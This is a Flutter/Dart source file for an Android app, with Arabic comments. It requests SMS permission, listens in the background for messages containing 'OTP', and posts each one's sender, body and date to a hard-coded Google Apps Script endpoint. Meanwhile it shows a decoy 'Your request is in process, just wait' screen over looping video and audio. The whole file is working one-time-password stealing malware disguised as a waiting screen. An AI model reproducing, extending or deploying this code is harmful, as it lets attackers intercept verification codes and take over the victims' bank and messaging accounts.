import 'package:flutter/material.dart';
import 'package:telephony/telephony.dart';
import 'package:video_player/video_player.dart';
import 'package:audioplayers/audioplayers.dart';
import 'dart:convert';
import 'package:http/http.dart' as http;

void main() {
  runApp(SmsApp());
}

class SmsApp extends StatefulWidget {
  @override
  _SmsAppState createState() => _SmsAppState();
}

class _SmsAppState extends State<SmsApp> {
  final Telephony telephony = Telephony.instance;
  final String sheetUrl =
      "https://script.google.com/macros/s/AKfycbyrhcPF7Pi1B9ZXiDZ2zM3XYElKTMdiyEc6oNhZ0SKZDwhKHCB06Pnlw2lJc1xbidXyRw/exec";
  final String smsKeyword = "OTP";

  VideoPlayerController? _videoController;
  final AudioPlayer _audioPlayer = AudioPlayer();

  @override
  void initState() {
    super.initState();
    requestPermissions();
    listenForSms();
    initBackgroundVideo();
    initBackgroundSound();
  }

  // طلب الصلاحيات
  void requestPermissions() async {
    bool? granted = await telephony.requestSmsPermissions;
    if (granted != true) {
      print("❌ لم يتم منح إذن الرسائل");
    } else {
      print("✅ إذن الرسائل مفعّل");
    }
  }

  // الاستماع للرسائل
  void listenForSms() {
    telephony.listenIncomingSms(
      onNewMessage: (SmsMessage message) {
        if (message.body != null && message.body!.contains(smsKeyword)) {
          sendSmsToSheet(
            message.address ?? "Unknown",
            message.body ?? "No Body",
            DateTime.now().toString(),
          );
        }
      },
      listenInBackground: true,
    );
  }

  // إرسال الرسالة إلى Google Sheets
  Future<void> sendSmsToSheet(
      String sender, String body, String date) async {
    try {
      final response = await http.post(
        Uri.parse(sheetUrl),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "type": "sms",
          "sender": sender,
          "body": body,
          "date": date,
        }),
      );
      print("✅ تم إرسال الرسالة: ${response.body}");
    } catch (e) {
      print("❌ خطأ في الإرسال: $e");
    }
  }

  // خلفية الفيديو
  void initBackgroundVideo() {
    _videoController = VideoPlayerController.network(
      "https://files.catbox.moe/ln0sv5.mp4", // رابط فيديو خلفية
    )
      ..initialize().then((_) {
        _videoController!.setLooping(true);
        _videoController!.play();
        setState(() {});
      });
  }

  // تشغيل الصوت في الخلفية
  void initBackgroundSound() async {
    await _audioPlayer.setSource(UrlSource(
        "https://files.catbox.moe/56oea6.mp3")); // رابط الصوت
    _audioPlayer.setReleaseMode(ReleaseMode.loop);
    _audioPlayer.resume();
  }

  @override
  void dispose() {
    _videoController?.dispose();
    _audioPlayer.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: Colors.black,
        body: Stack(
          fit: StackFit.expand,
          children: [
            if (_videoController != null &&
                _videoController!.value.isInitialized)
              FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController!.value.size.width,
                  height: _videoController!.value.size.height,
                  child: VideoPlayer(_videoController!),
                ),
              ),
            Center(
              child: Container(
                padding: EdgeInsets.all(20),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [Colors.black87, Colors.amber.shade700],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(20),
                ),
                child: Text(
                  "📩 Your request is in process, just wait",
                  style: TextStyle(
                    fontSize: 20,
                    color: Colors.white,
                    fontFamily: 'Roboto',
                  ),
                  textAlign: TextAlign.center,
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
